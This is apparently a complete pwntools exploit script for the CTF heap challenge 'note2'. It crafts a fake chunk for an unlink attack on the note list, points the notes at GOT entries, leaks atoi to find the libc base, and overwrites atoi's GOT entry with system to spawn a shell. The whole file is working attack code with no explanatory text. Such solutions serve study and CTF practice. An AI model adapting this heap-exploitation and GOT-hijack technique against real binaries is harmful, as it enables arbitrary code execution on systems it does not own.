#!/usr/bin/env python
#-*- coding:utf-8 -*-

# Author: I0gan
# Team  : D0g3

from pwn import *
#from LibcSearcher import LibcSearcher

#context.log_level='debug'
#context.terminal = ['konsole', '-x', 'bash', 'c']
#context.terminal = 'konsole'

#context(arch = 'i386', os = 'linux', log_level='debug')
context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile  = "note2"
#libFile  = "libc.so.6"
libFile  = "/lib/x86_64-linux-gnu/libc.so.6"

remoteIp = "0.0.0.0"
remotePort = 0

LOCAL = 1
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
pd32  = lambda x : p32(x).decode() #python3 not surport str + bytes
pd64  = lambda x : p64(x).decode()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)

#--------------------------Func-----------------------------
def ad(size, text):
	sla('option--->>', str(1))
	sla('(less than 128)', str(size))
	sla(':', text)

def dp(index):
	sla('option--->>', str(2))	
	sla(':', str(index))	

def md(index, opt, text):
	sla('option--->>', str(3))	
	sla('Input the id of the note:', str(index))
	sla('[1.overwrite/2.append]', str(opt))
	sla('TheNewContents:', text)

def rm(index):
	sla('option--->>', str(4))
	sla(':', str(index))	

def q():
	sla(':', str(5))	

#--------------------------Exploit--------------------------
def exploit():
	list_addr = 0x602120
	sla(':', 'i0gan')
	sla(':', 'GuiZhou')

	ad(0x10, 'A')
	ad(0x30, 'B' * 0x30)
	ad(0x80, 'C' * 0x80)
	rm(0)

	p = '\x00' * 0x10 + p64(0x0) + p64(0x41)
	# fake chunk
	p += p64(0x0) #prev_size
	p += p64(0x30)
	p += p64(list_addr + 8 - 0x18) #fd
	p += p64(list_addr + 8 - 0x10) #bk
	p += p64(0x30)
	p += p64(0x0)
	p += p64(0x30) #prev_size
	p += p64(0x90)

	ad(0, p) #idx 3
	rm(2)
	p = '\x01' * 0x10
	p += p64(exe.got['atoi']) #0
	p += p64(exe.got['puts']) #1
	md(1, 1, p)

	dp(0)
	atoi_addr = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	libc_base = atoi_addr - lib.symbols['atoi']
	sys_addr = libc_base + lib.symbols['system']

	li('atoi_addr: ' + hex(atoi_addr))
	li('libc_base: ' + hex(libc_base))

	p = p64(sys_addr)
	md(0, 1, p)
	
	sl('sh')

#	db()
#	md(0, 1, p64(exe.plt['puts'])) #


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()

